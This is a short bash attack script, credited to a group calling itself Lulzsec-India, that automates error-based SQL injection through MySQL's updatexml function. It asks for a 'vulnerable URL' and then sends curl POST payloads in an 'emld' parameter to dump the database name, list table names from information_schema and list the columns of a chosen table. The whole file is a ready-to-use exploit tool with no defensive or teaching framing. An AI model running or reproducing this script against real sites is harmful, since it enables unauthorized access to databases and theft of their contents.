#!/bin/bash
clear
## X-Path Dumper Prt 1##
figlet X-Path Dumper
echo "================================================================="
echo -e "===========\e[32m Xpath-Automated-DB::Dumper-By-Lulzsec-India \e[0m========="
echo -e "===\033[31mLove to :: Drag0n,Raun,G4BB4R,CH4M4N,PO,LALA & Lulz Members\e[0m==="
echo "================================================================="
echo "Enter The Vulnerable URL"
read u

database(){
	
	curl --silent -d "emld=admin' and updatexml(null,concat(0x3a3a,database()),null)-- -&wpas=admin" $u | cut -d ':' -f4-
	return
	}
echo "==============================================================="
echo -e "\033[31mThe Database's found :: \e[0m"
database

tables(){
	
	for i in `seq 1 25`; do
	curl --silent -d "emld=admin' and updatexml(null,concat(0x3a3a,(select concat(table_name) from information_schema.tables where table_schema=database() limit $i,1)),null)-- -&wpas=eee" $u | cut -d ':' -f4-
	done
	}

columns(){
	for i in `seq 1 10`; do
	curl --silent -d "emld=admin' and updatexml(null,concat(0x3a3a,(select concat(column_name) from information_schema.columns where table_name='$ch' limit $i,1)),null)-- -&wpas=admin" $u | cut -d ':' -f4-
	done
}
echo "================================================================="
echo -e "\033[31m Dumping Tables Now :: \e[0m"
tables
echo "================================================================="
echo "Enter the name of The Table to Dump Columns from"
read ch
echo -e "\033[31m Dumping Columns Now \e[0m"
columns
echo "================================================================="
